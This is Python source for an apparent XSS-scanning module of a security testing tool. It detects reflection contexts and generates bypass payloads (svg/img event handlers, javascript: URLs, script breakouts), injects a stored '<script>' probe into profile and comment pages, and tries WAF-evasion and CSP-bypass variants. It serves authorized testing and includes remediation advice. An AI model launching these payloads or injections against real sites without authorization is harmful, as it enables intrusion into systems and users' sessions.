"""
modules/xss.py
──────────────
Cross-Site Scripting (XSS) test module — extracted & refactored from V28.

FOR AUTHORIZED SECURITY TESTING AND CTF COMPETITIONS ONLY.

Detection strategies
────────────────────
1. Reflected XSS  — payload injected via GET/POST param, checked for reflection
2. Context-aware  — detects HTML / attribute / script / URL / comment context
                    and generates targeted bypass payloads for that context
3. DOM XSS        — browser-driven via Playwright; console.log marker detection
4. Stored XSS     — injects then re-fetches a profile/view URL to detect persistence

All findings are appended to scanner.results as Vulnerability objects.

Public API
──────────
    async def run(scanner) -> None

Requires scanner attributes
────────────────────────────
    scanner.config          dict  — keys: verbose, waf_detected, use_browser,
                                          browser, skip_dom_xss, timeout
    scanner.results         list  — Vulnerability objects appended here
    scanner.waf_evasion     AdvancedWAFEvasion instance (generate_variants)
    scanner._make_request   coroutine(method, url, *, params, data, json) → Response|None
    scanner._get_baseline   coroutine(url, method, param) → Response|None
    scanner.log_vuln        callable(Vulnerability) → None
    scanner._calculate_severity  callable(vuln_type_str) → (severity, cvss_float)
    scanner.param_map       dict[url, list[param_name]]
    scanner.seen_post_urls  set of (url, param) tuples already tested via POST
"""

from __future__ import annotations

import asyncio
import html
import logging
import urllib.parse
from difflib import SequenceMatcher
from typing import Dict, List, Optional, Tuple

from core.models import Vulnerability, calculate_severity
from payloads.xss_payloads import CONTEXT_MAP, CSP_BYPASS_PAYLOADS

logger = logging.getLogger(__name__)


# ─────────────────────────────────────────────────────────────────────────────
# SmartReflectionDetector
# ─────────────────────────────────────────────────────────────────────────────

class SmartReflectionDetector:
    """
    Context-aware XSS reflection detector — V13 logic extracted from V28.

    Checks for:
      - Exact match
      - URL-encoded match
      - HTML-encoded match (sanitised — medium confidence)
      - Fuzzy/partial word-match (≥ threshold similarity)

    Also detects the injection context (html, attribute, script, url, comment)
    and can generate context-specific bypass payloads.
    """

    def __init__(self, verbose: bool = False) -> None:
        self.verbose = verbose

    # ── core reflection check ─────────────────────────────────────────────────

    def is_reflected(
        self,
        payload: str,
        response: str,
        threshold: float = 0.80,
    ) -> Tuple[bool, str, str]:
        """
        Check whether *payload* appears in *response*.

        Returns
        -------
        (is_reflected, context, evidence)
          is_reflected  bool   — True if any form of the payload is present
          context       str    — 'html'|'attribute'|'script'|'url'|'comment'|
                                 'partial'|'none'|'unknown'
          evidence      str    — human-readable description
        """
        # 1. Exact
        if payload in response or html.unescape(payload) in response:
            context = self._detect_context(payload, response)
            return True, context, "Exact match"

        # 2. URL-encoded
        encoded = urllib.parse.quote(payload)
        if encoded in response:
            context = self._detect_context(encoded, response)
            return True, context, "URL-encoded match"

        # 3. HTML-encoded (sanitised — still noteworthy)
        html_encoded = html.escape(payload)
        if html_encoded in response:
            context = self._detect_context(html_encoded, response)
            return True, context, "HTML-encoded match (may be sanitized)"

        # 4. Fuzzy word-match
        payload_words = set(payload.split())
        if len(payload_words) > 2:
            response_lower = response.lower()
            matches = sum(
                1 for w in payload_words
                if len(w) > 3 and w.lower() in response_lower
            )
            similarity = matches / len(payload_words)
            if similarity >= threshold:
                return True, "partial", f"Partial reflection ({similarity:.0%} match)"

        return False, "none", "Not reflected"

    # ── context detection ─────────────────────────────────────────────────────

    def _detect_context(self, payload: str, response: str) -> str:
        """
        Identify the HTML context in which *payload* appears.

        Returns one of: 'script', 'attribute', 'comment', 'url', 'html', 'unknown'
        """
        index = response.find(payload)
        if index == -1:
            return "unknown"

        window_start = max(0, index - 100)
        window_end   = min(len(response), index + len(payload) + 100)
        pre           = response[window_start:index]
        post          = response[index + len(payload):window_end]

        if "<script" in pre and "</script>" in post:
            return "script"
        if pre and pre[-1] in ('"', "'"):
            return "attribute"
        if "<!--" in pre and "-->" in post:
            return "comment"
        if "href=" in pre or "src=" in pre:
            return "url"
        return "html"

    # ── context-specific bypass generation ───────────────────────────────────

    def generate_context_payloads(
        self, base_payload: str, detected_context: str
    ) -> List[str]:
        """
        Generate payloads tailored to the detected reflection context.

        Parameters
        ----------
        base_payload      e.g. 'alert(1)'
        detected_context  one of the values returned by _detect_context()
        """
        if detected_context == "attribute":
            return [
                f"' {base_payload} '",
                f'" {base_payload} "',
                f"' autofocus onfocus={base_payload} '",
                f"' onmouseover={base_payload} '",
                f"\" onerror={base_payload} \"",
                f"\" tabindex=1 onfocus={base_payload} \"",
            ]

        if detected_context == "script":
            return [
                f"';{base_payload};//",
                f'";{base_payload};//',
                f"'-{base_payload}-'",
                f'"-{base_payload}-"',
                f"`;{base_payload};//",
                f"\\';{base_payload};//",
            ]

        if detected_context == "comment":
            return [
                f"-->{base_payload}<!--",
                f"--!>{base_payload}<!--",
            ]

        if detected_context == "url":
            return [
                f"javascript:{base_payload}",
                f"data:text/html,<script>{base_payload}</script>",
                f"JaVaScRiPt:{base_payload}",
            ]

        # Default: HTML context
        return [
            f"<svg/onload={base_payload}>",
            f"<img src=x onerror={base_payload}>",
            f"<body onload={base_payload}>",
            f"<details open ontoggle={base_payload}>",
        ]


# ─────────────────────────────────────────────────────────────────────────────
# Internal helpers
# ─────────────────────────────────────────────────────────────────────────────

_detector = SmartReflectionDetector()


def _make_vuln(
    vuln_type: str,
    url: str,
    param: str,
    payload: str,
    evidence: str,
    method: str,
    detection_method: str,
    confidence: str,
    severity: str,
    cvss: float,
) -> Vulnerability:
    return Vulnerability(
        type=vuln_type,
        url=url,
        parameter=param,
        payload=payload,
        evidence=evidence,
        confidence=confidence,
        severity=severity,
        cvss_score=cvss,
        method=method,
        detection_method=detection_method,
        remediation=(
            "1. HTML-encode all output in the appropriate context (HTML / attribute / JS / URL). "
            "2. Adopt a Content Security Policy (CSP) with a strict allowlist. "
            "3. Use a mature templating engine with auto-escaping enabled. "
            "4. Validate and reject unexpected characters server-side. "
            "See: https://cheatsheetseries.owasp.org/cheatsheets/Cross_Site_Scripting_Prevention_Cheat_Sheet.html"
        ),
        references=["CWE-79", "OWASP-A03:2021"],
    )


# ─────────────────────────────────────────────────────────────────────────────
# Detection strategies
# ─────────────────────────────────────────────────────────────────────────────

async def _test_reflected(scanner, url: str, param: str, method: str) -> bool:
    """
    Strategy 1 & 2 — Reflected + Context-Aware XSS.

    Iterates every (payload, context) pair from CONTEXT_MAP.
    For each reflected payload:
      - Determines whether it is sanitised (HTML-encoded) → Medium confidence
      - If a different context is detected than expected → attempts a bypass
      - Logs a Vulnerability and returns True on first confirmed finding.
    """
    verbose = scanner.config.get("verbose", False)

    all_payloads: List[Tuple[str, str]] = [
        (p, ctx)
        for ctx, payloads in CONTEXT_MAP.items()
        for p in payloads
    ]

    for payload, context_type in all_payloads:
        # WAF bypass variants when WAF detected
        variants: List[str]
        if getattr(scanner, "waf_detected", False):
            variants = scanner.waf_evasion.generate_variants(payload, 2)
        else:
            variants = [payload]

        for variant in variants:
            res = await scanner.make_request(method, url, params={param: variant})
            if res is None:
                continue

            is_reflected, detected_context, evidence = _detector.is_reflected(
                variant, res.text
            )

            if not is_reflected:
                continue

            # Determine exploitability / confidence
            is_exploitable = "HTML-encoded" not in evidence
            confidence     = "High" if is_exploitable else "Medium"
            active_variant = variant
            active_evidence = f"{evidence} | Context: {detected_context}"

            # Context mismatch → try a targeted bypass
            if detected_context not in ("none", "unknown", context_type):
                bypass_payloads = _detector.generate_context_payloads(
                    "alert(1)", detected_context
                )
                if bypass_payloads:
                    bp_res = await scanner.make_request(
                        method, url, params={param: bypass_payloads[0]}
                    )
                    if bp_res:
                        bp_reflected, _, _ = _detector.is_reflected(
                            bypass_payloads[0], bp_res.text
                        )
                        if bp_reflected:
                            active_variant  = bypass_payloads[0]
                            active_evidence = (
                                f"Context-aware bypass successful ({detected_context})"
                            )
                            confidence      = "High"
                            is_exploitable  = True

            vuln_label = (
                f"XSS (Context-Aware [{detected_context}])"
                if detected_context not in ("none", "unknown")
                else "XSS (Reflected)"
            )
            severity, cvss = calculate_severity("XSS (Reflected)")

            scanner.log_vuln(
                _make_vuln(
                    vuln_label, url, param, active_variant,
                    active_evidence, method,
                    f"Smart reflection + context analysis ({detected_context})",
                    confidence, severity, cvss,
                )
            )
            return True

    return False


async def _test_dom(scanner, url: str, param: str) -> bool:
    """
    Strategy 3 — DOM XSS (browser-driven via Playwright).

    Requires scanner.use_browser=True and scanner.browser to be set.
    Injects each DOM probe, navigates with Playwright, listens for the
    console.log('DOM_XSS_PROBE') marker.
    """
    if not getattr(scanner, "use_browser", False) or not getattr(scanner, "browser", None):
        return False

    dom_payloads = CONTEXT_MAP.get("dom", [])

    for payload in dom_payloads:
        test_url = f"{url}?{param}={urllib.parse.quote(payload)}"
        try:
            page = await scanner.browser.new_page()
            console_logs: List[str] = []
            page.on("console", lambda msg: console_logs.append(msg.text))

            await page.goto(test_url, wait_until="networkidle", timeout=10_000)
            await asyncio.sleep(1)
            await page.close()

            if any("DOM_XSS_PROBE" in log for log in console_logs):
                severity, cvss = calculate_severity("XSS (Reflected)")
                scanner.log_vuln(
                    _make_vuln(
                        "DOM XSS", url, param, payload,
                        f"Console marker detected: {console_logs}",
                        "GET",
                        "Browser-based DOM analysis (Playwright)",
                        "High", severity, cvss,
                    )
                )
                return True

        except Exception as exc:
            if scanner.config.get("verbose"):
                logger.debug("DOM XSS Playwright error: %s", str(exc)[:120])

    return False


async def _test_stored(scanner, url: str, param: str, method: str) -> bool:
    """
    Strategy 4 — Stored / Persistent XSS.

    Injects a uniquely tagged probe, submits it, then re-fetches
    a profile or review URL to check for persistence.
    """
    profile_paths = [
        "/profile", "/account", "/user", "/settings",
        "/dashboard", "/comments", "/reviews", "/posts",
    ]

    probe = "<script>console.log('STORED_XSS_PROBE')</script>"
    res = await scanner.make_request(method, url, params={param: probe})
    if res is None:
        return False

    base = urllib.parse.urlparse(url)
    for path in profile_paths:
        check_url = f"{base.scheme}://{base.netloc}{path}"
        check_res = await scanner.make_request("GET", check_url)
        if check_res and "STORED_XSS_PROBE" in check_res.text:
            severity, cvss = calculate_severity("XSS (Reflected)")
            scanner.log_vuln(
                _make_vuln(
                    "XSS (Stored)", url, param, probe,
                    f"Probe persisted and reflected at {check_url}",
                    method,
                    "Stored-XSS probe + re-fetch verification",
                    "High", severity, cvss,
                )
            )
            return True

    return False


async def _test_csp_bypass(scanner, url: str, param: str, method: str) -> bool:
    """
    Strategy 5 — CSP bypass probes.

    Tries known CSP-bypass gadgets. A finding here indicates that
    the server's Content-Security-Policy may be insufficient even
    if basic XSS is otherwise blocked.
    """
    for payload in CSP_BYPASS_PAYLOADS:
        variants: List[str]
        if getattr(scanner, "waf_detected", False):
            variants = scanner.waf_evasion.generate_variants(payload, 2)
        else:
            variants = [payload]

        for variant in variants:
            res = await scanner.make_request(method, url, params={param: variant})
            if res is None:
                continue

            is_reflected, context, evidence = _detector.is_reflected(variant, res.text)
            if is_reflected and "HTML-encoded" not in evidence:
                severity, cvss = calculate_severity("XSS (Reflected)")
                scanner.log_vuln(
                    _make_vuln(
                        "XSS (CSP Bypass)", url, param, variant,
                        f"{evidence} | Context: {context}",
                        method,
                        "CSP bypass gadget reflection check",
                        "High", severity, cvss,
                    )
                )
                return True

    return False


# ─────────────────────────────────────────────────────────────────────────────
# Module entry point
# ─────────────────────────────────────────────────────────────────────────────

async def run(scanner, url: str, param: str, method: str = "GET") -> None:
    """Entry point called per-param by scan_url()."""
    verbose = scanner.config.get("verbose", False)
    skip_dom = scanner.config.get("skip_dom_xss", False)
    found = False

    if await _test_reflected(scanner, url, param, method):
        found = True

    if not found and not skip_dom:
        if await _test_dom(scanner, url, param):
            found = True

    if not found:
        if await _test_stored(scanner, url, param, method):
            found = True

    if not found:
        await _test_csp_bypass(scanner, url, param, method)

    if verbose and not found:
        logger.debug("XSS: no finding at %s [%s]", url, param)
